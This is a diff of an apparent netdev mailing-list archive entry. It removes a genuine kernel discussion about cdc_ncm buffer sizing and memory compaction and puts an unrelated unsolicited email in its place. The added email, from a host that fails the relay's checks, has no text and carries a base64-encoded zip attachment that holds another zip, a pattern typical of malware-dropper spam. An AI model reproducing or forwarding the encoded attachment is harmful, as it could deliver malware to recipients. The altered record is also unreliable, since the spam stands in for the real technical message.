@@ -1,60 +1,71 @@
-From: "Baxter, Jim" <jim_baxter@mentor.com>
-Subject: Re: [RFC V1 1/1] net: cdc_ncm: Reduce memory use when kernel memory
- low
-Date: Wed, 17 May 2017 11:56:05 +0100
-Message-ID: <b8114201-8beb-23ea-479a-9db006d4a668@mentor.com>
-References: <1494956480-6127-1-git-send-email-jim_baxter@mentor.com>
- <1494956480-6127-2-git-send-email-jim_baxter@mentor.com>
- <87shk4fynp.fsf@miraculix.mork.no> <1495007060.30577.8.camel@suse.com>
+From: <anita.traylor@maryvillecollege.edu>
+Subject: (unknown)
+Date: Wed, 17 May 2017 10:59:22 -0000
+Message-ID: <149501876218.6150.14644224025063333078@isurgut.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: 8bit
-Cc: <linux-kernel@vger.kernel.org>, <linux-usb@vger.kernel.org>,
-        <netdev@vger.kernel.org>
-To: Oliver Neukum <oneukum@suse.com>,
-        =?UTF-8?Q?Bj=c3=b8rn_Mork?= <bjorn@mork.no>
+Content-Type: application/zip; name="55356090.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from relay1.mentorg.com ([192.94.38.131]:62464 "EHLO
-        relay1.mentorg.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1753553AbdEQK4L (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Wed, 17 May 2017 06:56:11 -0400
-In-Reply-To: <1495007060.30577.8.camel@suse.com>
+Received: from 5-141-97-224.static-adsl.isurgut.ru ([5.141.87.224]:35988 "HELO
+        isurgut.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1754340AbdEQK71 (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Wed, 17 May 2017 06:59:27 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-From: Oliver Neukum (oneukum@suse.com) Sent: Wed, 17 May 2017 09:44:20 +0200 
-
-> Am Dienstag, den 16.05.2017, 20:24 +0200 schrieb Bjørn Mork:
->>
->> I must say that I don't like the additional complexity added here.  If
->> there are memory issues and you can reduce the buffer size to
->> USB_CDC_NCM_NTB_MIN_OUT_SIZE, then why don't you just set a lower tx_max
->> buffer size in the first place?
->>
->>   echo 2048 > /sys/class/net/wwan0/cdc_ncm/tx_max
->>
-
-Hi
-
-The issue is we need the higher performance for Mirrorlink to be able to
-work correctly. The low memory situation only occurs very occasionally and
-once the kernel has run compaction if this issue occurs again it will be
-many hours later.
-
-> 
-> Hi,
-> 
-> that would hurt performance across the board though.
-> Can we trigger memory compactation earlier?
-> 
-> 	Regards
-> 		Oliver
-> 
-
-We initially tried increasing the vm.min_free_kbytes but the value needed to address
-the problem was around 65536 which then meant some other applications were unable to
-run due to there not being enough free memory.
-The i.MX6 based system has 863MB of RAM in total.
-
-Regards,
-Jim
+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
